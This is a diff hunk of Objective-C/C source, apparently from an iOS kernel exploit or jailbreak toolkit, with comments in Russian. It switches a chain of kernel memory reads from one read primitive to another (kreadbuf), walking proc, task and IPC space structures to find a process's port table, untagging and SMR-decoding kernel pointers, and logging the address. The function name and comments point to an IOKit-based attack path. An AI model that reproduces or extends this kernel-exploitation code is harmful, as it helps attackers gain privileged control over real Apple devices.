@@ -5766,15 +5766,18 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     uint32_t ctlPFN = (uint32_t)(ctlPA >> 14);
     uint64_t isTable = 0;
     {
+        // 1.9.134: isTable-цепочка на kreadbuf (zone-map capable) — kpRead не
+        // транслирует регион proc'ов (kobj=0 на 1.9.133).
         uint64_t pr2 = 0, tk2 = 0, spc2 = 0, tb2 = 0;
         if (selfProcM &&
-            kpRead(selfProcM + koffsetof(proc, proc_ro), &pr2, 8, "ps proc_ro2", r) &&
-            kpRead(kp_untag_ptr(pr2) + off_proc_ro_pr_task, &tk2, 8, "ps task2", r) &&
-            kpRead(kp_untag_ptr(tk2) + off_task_itk_space, &spc2, 8, "ps itk2", r) &&
-            kpRead(kp_untag_ptr(spc2) + off_ipc_space_is_table, &tb2, 8, "ps istable2", r)) {
+            kreadbuf(selfProcM + koffsetof(proc, proc_ro), &pr2, 8) &&
+            kreadbuf(kp_untag_ptr(pr2) + off_proc_ro_pr_task, &tk2, 8) &&
+            kreadbuf(kp_untag_ptr(tk2) + off_task_itk_space, &spc2, 8) &&
+            kreadbuf(kp_untag_ptr(spc2) + off_ipc_space_is_table, &tb2, 8)) {
             isTable = (koffsetof(ipc_space, table_uses_smr) && smr_base && t1sz_boot)
                       ? kp_untag_ptr(kpSMRDecode(tb2)) : kp_untag_ptr(tb2);
         }
+        kpNote(r, [NSString stringWithFormat:@"  isTable=%#llx", (unsigned long long)isTable]);
     }
     // 3. Trusted-path резолв surfVA через M2 async op-entry (1.9.124):
     //    async submit резолвит surface ptr в op-entry БЕЗ execute/снапшота
